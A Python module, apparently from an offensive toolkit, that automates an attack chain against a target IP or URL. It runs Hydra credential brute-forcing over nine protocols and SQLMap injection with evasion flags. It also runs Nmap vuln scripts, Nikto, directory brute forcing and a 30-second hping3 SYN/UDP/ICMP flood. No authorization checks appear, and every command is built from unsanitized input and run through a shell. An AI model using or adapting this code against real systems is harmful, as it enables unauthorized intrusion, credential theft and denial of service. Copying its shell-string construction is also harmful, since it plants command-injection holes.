#!/usr/bin/env python3
"""
Attack Chain — Individual attack execution functions.
Each function wraps a security tool (Hydra, SQLMap, Nmap scripts, Nikto, Dirb)
and returns structured results with live output streaming.
"""

import os
import sys
import subprocess
import json
import re
import time
import threading

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'recon'))
from utility import status_msg, success_msg, error_msg, warning_msg, info_msg, console


# ─── WORDLIST HELPERS ──────────────────────────────────────

def find_wordlist(wl_type='passwords'):
    """Find a suitable wordlist on the system."""
    wordlists = {
        'passwords': [
            '/usr/share/wordlists/rockyou.txt',
            '/usr/share/wordlists/fasttrack.txt',
            '/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt',
            '/usr/share/seclists/Passwords/Common-Credentials/best1050.txt',
            '/usr/share/wordlists/nmap.lst',
        ],
        'usernames': [
            '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
            '/usr/share/wordlists/metasploit/unix_users.txt',
        ],
        'dirs': [
            '/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt',
            '/usr/share/dirb/wordlists/common.txt',
            '/usr/share/seclists/Discovery/Web-Content/common.txt',
        ]
    }

    for path in wordlists.get(wl_type, []):
        if os.path.exists(path):
            return path

    # Create a minimal fallback
    if wl_type == 'passwords':
        minimal = ['admin', 'password', '123456', 'root', 'toor', 'admin123',
                    'letmein', 'welcome', 'monkey', 'dragon', 'master', 'qwerty',
                    'login', 'password1', 'abc123', 'starwars', 'trustno1', '1234567890']
    elif wl_type == 'dirs':
        minimal = ['admin', 'login', 'wp-admin', 'dashboard', 'api', 'config',
                    'backup', 'test', 'uploads', 'images', 'css', 'js', '.git',
                    '.env', 'phpmyadmin', 'cpanel', 'webmail', 'server-status']
    else:
        minimal = ['admin', 'root', 'user', 'test', 'guest', 'administrator',
                    'ftp', 'www', 'web', 'info', 'mysql', 'oracle', 'postgres']

    fallback_path = f'/tmp/nullprotocol_{wl_type}.txt'
    with open(fallback_path, 'w') as f:
        f.write('\n'.join(minimal))
    return fallback_path


def run_tool_live(cmd, timeout=300, output_file=None, label="Attack"):
    """Execute a security tool with LIVE output streaming.
    Shows real-time output so the user knows the tool is running.
    """
    full_output = []
    start_time = time.time()

    try:
        process = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        # Read output line by line in real-time
        lines_shown = 0
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line:
                stripped = line.strip()
                full_output.append(stripped)
                # Show important lines to the user
                if stripped and not stripped.startswith('[!]'):
                    elapsed = int(time.time() - start_time)
                    # Show every line but keep it clean
                    if lines_shown < 200:  # Cap visible output
                        console.print(f"  [dim]  [{elapsed}s] {stripped[:120]}[/dim]")
                        lines_shown += 1

            # Check timeout
            if time.time() - start_time > timeout:
                process.kill()
                warning_msg(f"{label} timed out after {timeout}s")
                break

        process.wait(timeout=10)
        return_code = process.returncode

        output = '\n'.join(full_output)
        elapsed = int(time.time() - start_time)
        info_msg(f"{label} completed in {elapsed}s ({len(full_output)} output lines)")

        if output_file:
            with open(output_file, 'w') as f:
                f.write(f"Command: {cmd}\n")
                f.write(f"Return Code: {return_code}\n")
                f.write(f"Duration: {elapsed}s\n")
                f.write("=" * 60 + "\n")
                f.write(output)

        return {
            'success': return_code == 0,
            'output': output,
            'return_code': return_code,
            'duration': elapsed
        }

    except FileNotFoundError:
        return {'success': False, 'message': 'Tool not found. Is it installed?', 'output': ''}
    except Exception as e:
        return {'success': False, 'message': str(e), 'output': ''}


def _parse_hydra_creds(output):
    """Parse Hydra output for discovered credentials."""
    creds = []
    if output:
        for line in output.split('\n'):
            if 'host:' in line.lower() and ('login:' in line.lower() or 'password:' in line.lower()):
                creds.append(line.strip())
    return creds


# ─── HYDRA ATTACKS ──────────────────────────────────────────

def hydra_ssh(opportunity, output_dir):
    """Brute force SSH using Hydra."""
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '22')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')
    output_file = os.path.join(output_dir, f'hydra_ssh_{ip}_{port}.txt')

    info_msg(f"Launching Hydra SSH attack on {ip}:{port}")
    info_msg(f"Users: {user_list}, Passwords: {pass_list}")

    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 16 -f -vV '
           f'{ip} ssh')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra SSH")

    creds = _parse_hydra_creds(result.get('output', ''))
    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} credential(s)" if creds else "No credentials found"
    result['output_file'] = output_file

    return result


def hydra_ftp(opportunity, output_dir):
    """Brute force FTP using Hydra."""
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '21')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')
    output_file = os.path.join(output_dir, f'hydra_ftp_{ip}_{port}.txt')

    info_msg(f"Launching Hydra FTP attack on {ip}:{port}")

    # First try anonymous login
    anon_cmd = f'hydra -l anonymous -p anonymous -s {port} -f {ip} ftp'
    info_msg("Trying anonymous FTP login first...")
    anon_result = run_tool_live(anon_cmd, timeout=30, label="FTP Anon Check")

    if anon_result.get('output') and 'host:' in anon_result['output'].lower():
        success_msg("Anonymous FTP login successful!")
        with open(output_file, 'w') as f:
            f.write("ANONYMOUS FTP LOGIN SUCCESSFUL\n")
            f.write(anon_result['output'])
        return {
            'success': True,
            'message': 'Anonymous FTP login found!',
            'credentials_found': ['anonymous:anonymous'],
            'output_file': output_file
        }

    # Full brute force
    info_msg("Anonymous failed, starting brute force...")
    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 16 -f -vV '
           f'{ip} ftp')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra FTP")

    creds = _parse_hydra_creds(result.get('output', ''))
    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} credential(s)" if creds else "No credentials found"
    result['output_file'] = output_file

    return result


def hydra_http_form(opportunity, output_dir):
    """Brute force HTTP login form using Hydra."""
    url = opportunity.get('url', '')
    output_file = os.path.join(output_dir, f'hydra_http_{url.replace("/","_").replace(":","_")[:50]}.txt')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')

    info_msg(f"Launching Hydra HTTP Form attack on {url}")
    warning_msg("HTTP form attacks require manual tuning for best results")

    from urllib.parse import urlparse
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/login'

    form_params = f"{path}:username=^USER^&password=^PASS^:F=incorrect"
    protocol = 'https-post-form' if parsed.scheme == 'https' else 'http-post-form'

    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 16 -f -vV '
           f'{host} {protocol} "{form_params}"')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra HTTP")

    creds = _parse_hydra_creds(result.get('output', ''))
    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} credential(s)" if creds else "No credentials found (form params may need tuning)"
    result['output_file'] = output_file

    return result


def hydra_smtp(opportunity, output_dir):
    """Brute force SMTP using Hydra."""
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '25')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')
    output_file = os.path.join(output_dir, f'hydra_smtp_{ip}_{port}.txt')

    info_msg(f"Launching Hydra SMTP attack on {ip}:{port}")

    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 16 -f -vV '
           f'{ip} smtp')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra SMTP")

    creds = _parse_hydra_creds(result.get('output', ''))
    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} SMTP credential(s)" if creds else "No credentials found"
    result['output_file'] = output_file

    return result


def hydra_mysql(opportunity, output_dir):
    """Brute force MySQL using Hydra."""
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '3306')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')
    output_file = os.path.join(output_dir, f'hydra_mysql_{ip}_{port}.txt')

    info_msg(f"Launching Hydra MySQL attack on {ip}:{port}")

    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 16 -f -vV '
           f'{ip} mysql')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra MySQL")

    creds = _parse_hydra_creds(result.get('output', ''))
    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} MySQL credential(s)" if creds else "No credentials found"
    result['output_file'] = output_file

    return result


def hydra_rdp(opportunity, output_dir):
    """Brute force RDP using Hydra."""
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '3389')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')
    output_file = os.path.join(output_dir, f'hydra_rdp_{ip}_{port}.txt')

    info_msg(f"Launching Hydra RDP attack on {ip}:{port}")

    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 16 -f -vV '
           f'{ip} rdp')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra RDP")

    creds = _parse_hydra_creds(result.get('output', ''))
    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} RDP credential(s)" if creds else "No credentials found"
    result['output_file'] = output_file

    return result


def hydra_telnet(opportunity, output_dir):
    """Brute force Telnet using Hydra."""
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '23')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')
    output_file = os.path.join(output_dir, f'hydra_telnet_{ip}_{port}.txt')

    info_msg(f"Launching Hydra Telnet attack on {ip}:{port}")

    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 16 -f -vV '
           f'{ip} telnet')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra Telnet")

    creds = _parse_hydra_creds(result.get('output', ''))
    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} Telnet credential(s)" if creds else "No credentials found"
    result['output_file'] = output_file

    return result


def hydra_pop3(opportunity, output_dir):
    """Brute force POP3 using Hydra."""
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '110')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')
    output_file = os.path.join(output_dir, f'hydra_pop3_{ip}_{port}.txt')

    info_msg(f"Launching Hydra POP3 attack on {ip}:{port}")

    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 16 -f -vV '
           f'{ip} pop3')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra POP3")

    creds = _parse_hydra_creds(result.get('output', ''))
    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} POP3 credential(s)" if creds else "No credentials found"
    result['output_file'] = output_file

    return result


def hydra_imap(opportunity, output_dir):
    """Brute force IMAP using Hydra."""
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '143')

    user_list = find_wordlist('usernames')
    pass_list = find_wordlist('passwords')
    output_file = os.path.join(output_dir, f'hydra_imap_{ip}_{port}.txt')

    info_msg(f"Launching Hydra IMAP attack on {ip}:{port}")

    cmd = (f'hydra -L {user_list} -P {pass_list} '
           f'-s {port} -t 16 -f -vV '
           f'{ip} imap')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra IMAP")

    creds = _parse_hydra_creds(result.get('output', ''))
    result['credentials_found'] = creds
    result['message'] = f"Found {len(creds)} IMAP credential(s)" if creds else "No credentials found"
    result['output_file'] = output_file

    return result


# ─── SQLMAP ATTACKS ─────────────────────────────────────────

def sqlmap_url(opportunity, output_dir):
    """Test URL with GET parameters for SQL injection using SQLMap."""
    url = opportunity.get('url', '')
    output_file = os.path.join(output_dir, f'sqlmap_get_{url.replace("/","_").replace(":","_")[:50]}.txt')

    info_msg(f"Launching SQLMap on {url}")

    sqlmap_out = os.path.join(output_dir, 'sqlmap_output')
    os.makedirs(sqlmap_out, exist_ok=True)

    cmd = (f'sqlmap -u "{url}" '
           f'--batch --level=2 --risk=1 '
           f'--threads=10 '
           f'--output-dir={sqlmap_out} '
           f'--random-agent '
           f'--tamper=between '
           f'2>&1')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="SQLMap GET")

    # Check for SQLi confirmation
    injectable = False
    if result.get('output'):
        out_lower = result['output'].lower()
        injectable = any(indicator in out_lower for indicator in [
            'is vulnerable',
            'sqlmap identified the following injection point',
            'the back-end dbms is',
            'available databases',
        ])

    result['injectable'] = injectable
    result['message'] = "SQL Injection CONFIRMED!" if injectable else "No injection point found"
    result['success'] = injectable
    result['output_file'] = output_file

    return result


def sqlmap_form(opportunity, output_dir):
    """Test POST form for SQL injection using SQLMap."""
    url = opportunity.get('url', '')
    fields = opportunity.get('fields', [])
    output_file = os.path.join(output_dir, f'sqlmap_form_{url.replace("/","_").replace(":","_")[:50]}.txt')

    info_msg(f"Launching SQLMap Form Injection on {url}")
    info_msg(f"Fields: {', '.join(fields)}")

    sqlmap_out = os.path.join(output_dir, 'sqlmap_output')
    os.makedirs(sqlmap_out, exist_ok=True)

    # Build POST data string
    post_data = '&'.join([f'{field}=test' for field in fields])

    cmd = (f'sqlmap -u "{url}" '
           f'--data="{post_data}" '
           f'--method=POST '
           f'--batch --level=2 --risk=1 '
           f'--threads=10 '
           f'--output-dir={sqlmap_out} '
           f'--random-agent '
           f'2>&1')

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="SQLMap POST")

    injectable = False
    if result.get('output'):
        out_lower = result['output'].lower()
        injectable = any(indicator in out_lower for indicator in [
            'is vulnerable',
            'sqlmap identified the following injection point',
            'the back-end dbms is',
            'available databases',
        ])

    result['injectable'] = injectable
    result['message'] = "SQL Injection CONFIRMED!" if injectable else "No injection point found"
    result['success'] = injectable
    result['output_file'] = output_file

    return result


# ─── NMAP VULN SCAN ─────────────────────────────────────────

def nmap_vulnscan(opportunity, output_dir):
    """Run Nmap vulnerability scripts against a target."""
    ip = opportunity.get('ip', '')
    output_file = os.path.join(output_dir, f'nmap_vuln_{ip}.txt')

    info_msg(f"Launching Nmap Vuln Scripts on {ip}")

    cmd = (f'nmap -sV --script=vuln '
           f'-oN {output_file} '
           f'{ip}')

    result = run_tool_live(cmd, timeout=600, output_file=output_file, label="Nmap Vuln Scan")

    # Parse for CVEs
    cves = []
    if result.get('output'):
        cve_pattern = re.compile(r'CVE-\d{4}-\d+', re.IGNORECASE)
        cves = list(set(cve_pattern.findall(result['output'])))

    result['cves_found'] = cves
    result['message'] = f"Found {len(cves)} CVE(s)" if cves else "No CVEs identified"
    result['success'] = len(cves) > 0
    result['output_file'] = output_file

    return result


# ─── WEB SCANNING ───────────────────────────────────────────

def nikto_scan(opportunity, output_dir):
    """Run Nikto web vulnerability scanner against a target."""
    url = opportunity.get('url', '')
    from urllib.parse import urlparse
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)

    output_file = os.path.join(output_dir, f'nikto_{host}_{port}.txt')

    info_msg(f"Launching Nikto scan on {url}")

    ssl_flag = '-ssl' if parsed.scheme == 'https' else ''
    cmd = (f'nikto -h {host} -p {port} {ssl_flag} '
           f'-output {output_file} '
           f'-Format txt '
           f'-Tuning x6 '
           f'-maxtime 300 '
           f'2>&1')

    result = run_tool_live(cmd, timeout=360, output_file=output_file, label="Nikto")

    # Count findings
    findings = 0
    if result.get('output'):
        for line in result['output'].split('\n'):
            if line.strip().startswith('+ ') and 'OSVDB' in line:
                findings += 1

    result['findings_count'] = findings
    result['message'] = f"Found {findings} potential issue(s)" if findings else "No web vulnerabilities found"
    result['success'] = findings > 0
    result['output_file'] = output_file

    return result


def dirb_scan(opportunity, output_dir):
    """Run directory brute force using Dirb or Gobuster."""
    url = opportunity.get('url', '')
    from urllib.parse import urlparse
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)

    output_file = os.path.join(output_dir, f'dirb_{host}_{port}.txt')
    wordlist = find_wordlist('dirs')

    info_msg(f"Launching directory brute force on {url}")

    # Try gobuster first, fall back to dirb
    gobuster_check = subprocess.run('which gobuster', shell=True, capture_output=True)
    if gobuster_check.returncode == 0:
        cmd = (f'gobuster dir -u {url} -w {wordlist} '
               f'-o {output_file} '
               f'-t 50 --no-error '
               f'-k '  # Skip TLS verification
               f'2>&1')
        label = "Gobuster"
    else:
        cmd = (f'dirb {url} {wordlist} '
               f'-o {output_file} '
               f'-r -S '  # Don't recurse, silent
               f'2>&1')
        label = "Dirb"

    result = run_tool_live(cmd, timeout=300, output_file=output_file, label=label)

    # Count discovered paths
    dirs_found = 0
    if result.get('output'):
        for line in result['output'].split('\n'):
            # Gobuster format: /path (Status: 200)
            # Dirb format: + http://... (CODE:200)
            if 'Status: 2' in line or 'Status: 3' in line or 'CODE:200' in line or 'CODE:301' in line:
                dirs_found += 1

    result['dirs_found'] = dirs_found
    result['message'] = f"Found {dirs_found} accessible path(s)" if dirs_found else "No hidden directories found"
    result['success'] = dirs_found > 0
    result['output_file'] = output_file

    return result


# ─── DOS STRESS TEST ────────────────────────────────────────

def hping3_dos(opportunity, output_dir):
    """
    Perform a Denial of Service (DoS) stress test using hping3.
    This simulates a flood attack to test system resilience.
    WARNING: High impact. Use with caution.
    """
    ip = opportunity.get('ip', '')
    port = opportunity.get('port', '80')
    mode = opportunity.get('mode', 'syn')
    
    output_file = os.path.join(output_dir, f'hping3_dos_{ip}_{mode}.txt')
    
    info_msg(f"Launching hping3 DoS ({mode.upper()} Flood) on {ip}:{port}")
    warning_msg("CAUTION: This will flood the target with packets for 30 seconds.")
    
    # Modes:
    # 1. SYN Flood (default): -S -p <port> --flood
    # 2. UDP Flood: --udp -p <port> --flood
    # 3. ICMP Flood: --icmp --flood
    
    flags = '-S' # SYN default
    if mode == 'udp':
        flags = '--udp'
    elif mode == 'icmp':
        flags = '--icmp'
        
    # Construct command
    # hping3 requires root privileges usually
    # We use 'timeout' to stop the flood after 30s
    
    cmd = (f'sudo timeout 30s hping3 {flags} '
           f'-p {port} --flood '
           f'{ip} '
           f'2>&1')

    # Expected exit code 124 for timeout command is normal
    result = run_tool_live(cmd, timeout=40, output_file=output_file, label=f"hping3 {mode.upper()}")
    
    result['message'] = "DoS Stress Test Completed (30s duration)"
    result['success'] = True # Always check logs
    
    return result
